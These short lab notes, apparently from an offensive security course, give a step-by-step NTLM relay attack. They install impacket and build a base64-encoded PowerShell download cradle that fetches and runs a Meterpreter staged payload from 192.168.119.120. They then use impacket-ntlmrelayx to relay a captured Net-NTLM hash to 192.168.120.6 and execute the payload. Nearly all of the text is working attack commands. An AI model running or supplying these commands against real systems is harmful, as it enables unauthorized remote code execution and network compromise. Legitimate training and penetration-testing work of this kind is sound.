#The hash captured with the unc path injection is called Net-NTLM hash.
#We are going to use it for remote code execution

#Install impacket 
kali@kali:~$ sudo apt install python3-impacket

#PowerShell runner to execute a Meterpreter staged payload
kali@kali:~$ sudo apt -y install powershell
kali@kali:~$ pwsh
PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
PS /home/kali> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
PS /home/kali> $EncodedText = [Convert]::ToBase64String($bytes)
PS /home/kali> $EncodedText

#launch impacket-ntlmrelayx and prevent it from setting up an HTTP web server with the â€“no-http-server flag.
kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc KABOAGUA...'

#Finally, we execute the C# console application on the Windows 10 client machine to force the SMB request from the SQL server. 
#This results in NTLM authentication against our Kali machine and relaying of the Net-NTLM hash.